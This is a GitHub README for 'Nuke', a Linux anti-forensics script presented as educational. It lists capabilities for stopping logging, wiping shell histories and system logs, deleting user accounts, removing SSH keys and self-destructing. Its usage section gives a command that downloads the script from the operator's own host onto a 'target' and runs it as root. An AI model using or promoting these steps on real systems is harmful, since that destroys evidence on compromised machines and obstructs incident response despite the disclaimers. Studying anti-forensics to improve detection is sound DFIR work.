# N U K E

```text
███╗   ██╗██╗   ██╗██╗  ██╗███████╗
████╗  ██║██║   ██║██║ ██╔╝██╔════╝
██╔██╗ ██║██║   ██║█████╔╝ █████╗
██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝
██║ ╚████║╚██████╔╝██║  ██╗███████╗
╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝

     Linux Anti-Forensics Automation Tool
```

> **Educational & Research Project**  
> A Linux anti-forensics automation tool developed for cybersecurity research, digital forensics education, and controlled laboratory environments. Demonstrates common anti-forensics techniques to support learning, security testing, and incident response training in authorized environments only.

---
<img width="945" height="1043" alt="Screenshot_29-Jul_05-18-38_1287" src="https://github.com/user-attachments/assets/cd867df3-ff76-4edc-97e6-eaa74e67b14c" />



## 📖 Overview

**Nuke** is a POSIX-compliant Linux anti-forensics automation tool that demonstrates how forensic artifacts can be systematically removed from a Linux system. It automates log wiping, history cleanup, user removal, secure file shredding, persistence cleanup, and self-destruction — techniques commonly studied in Digital Forensics & Incident Response (DFIR).

The goal is to help cybersecurity professionals, students, and DFIR analysts understand attacker cleanup behavior and improve defensive detection.
---

## ✨ Features

Current functionality includes:

- Stops syslog/rsyslog logging services
- Wipes Bash, Zsh, and SH history for all users
- Null-links history files to prevent future logging
- Wipes all system logs (auth, syslog, kern, mail, debug, boot, dmesg, udev, etc.)
- Clears binary logs (wtmp, btmp, lastlog, faillog)
- Removes rotated/compressed log archives
- Deletes non-default user accounts (UID >= 1000)
- Securely shreds attacker artifacts with 3-pass overwrite
- Cleans web shells, hidden scripts, and SUID backdoors
- Removes cron persistence and user crontabs
- Wipes SSH authorized_keys and known_hosts
- Restores sshd_config and /etc/hosts to defaults
- Flushes ARP/neighbor cache
- Wipes free disk and memory slack space
- Self-destructs — shreds itself and kills the shell


---

## 🎯 Purpose

Nuke was created to demonstrate:

* Linux anti-forensics concepts
* Artifact cleanup
* Secure file deletion
* Persistence removal
* Log manipulation
* Temporary file cleanup
* DFIR research
* Cybersecurity education

Understanding these techniques helps defenders recognize attacker behavior and improve forensic investigations.

---

## 🛠 Requirements

- Linux (any distro)
- POSIX shell (sh, bash, zsh)
- Root privileges


---
## 🚀 Installation

```bash
git clone https://github.com/abhinavms404/Nuke.git
cd Nuke
chmod +x nuke.sh
```

## Usage

```bash
sudo ./nuke.sh
```

Or transfer to a target and run remotely:

```bash
wget http://<your-ip>:8000/nuke.sh -O /tmp/nuke.sh
chmod +x /tmp/nuke.sh
sudo /tmp/nuke.sh
```

---

## 📂 Project Structure

```text
Nuke/
├── nuke.sh
├── README.md
└── LICENSE
```

---

## 🧪 Recommended Environment

Run only in controlled environments:

- Virtual Machines (VirtualBox, VMware)
- CTF labs (Metasploitable, Vulnhub)
- Cyber ranges
- Malware analysis labs
- Personal test systems

> **Do not execute on production systems or without explicit authorization.**


---

## Limitations

This tool does **not** guarantee complete forensic evasion. Evidence may persist in:

- Memory / RAM dumps
- Remote syslog / SIEM platforms
- EDR / XDR telemetry
- Hypervisor snapshots
- Journald (systemd-journald)
- Filesystem journals (ext4 journal)
- Backup systems
- Cloud logging (CloudTrail, CloudWatch)
- Network captures

---

## Educational Objectives

- Understand attacker cleanup methodology
- Study Linux forensic artifact locations
- Learn secure deletion techniques
- Practice DFIR investigation workflows
- Test detection capabilities of monitoring tools
- Build better defense strategies

---

## Roadmap

- [ ] Modular cleanup engine (selective wipe)
- [ ] Interactive / dry-run mode
- [ ] YAML/JSON configuration file
- [ ] Distribution-specific module support (apt, yum, pacman logs)
- [ ] systemd-journald support
- [ ] Auditd rule removal
- [ ] Docker lab environment
- [ ] Automated CI testing
- [ ] Forensic reporting (what was cleaned)

---

## Contributing

Contributions welcome. Open an issue or submit a PR for:

- New cleanup modules
- Bug fixes
- Documentation improvements
- Research ideas

---

## Disclaimer

This software is provided **strictly for educational purposes, cybersecurity research, digital forensics training, and authorized security testing**. It is intended to help defenders understand anti-forensics techniques.

The author does not encourage or condone unauthorized access, misuse, or illegal activity. Users are solely responsible for legal compliance.

The author assumes no liability for damages, data loss, or misuse.

---

## License

MIT License — see `LICENSE` for details.

---

## Author

**Abhinav M S (Matrix)**  
Cybersecurity Researcher  

- GitHub: [abhinavms404](https://github.com/abhinavms404)  
- Project: [Nuke](https://github.com/abhinavms404/Nuke)

---

⭐ **Star the repo if this helped you learn about Linux anti-forensics and DFIR!**

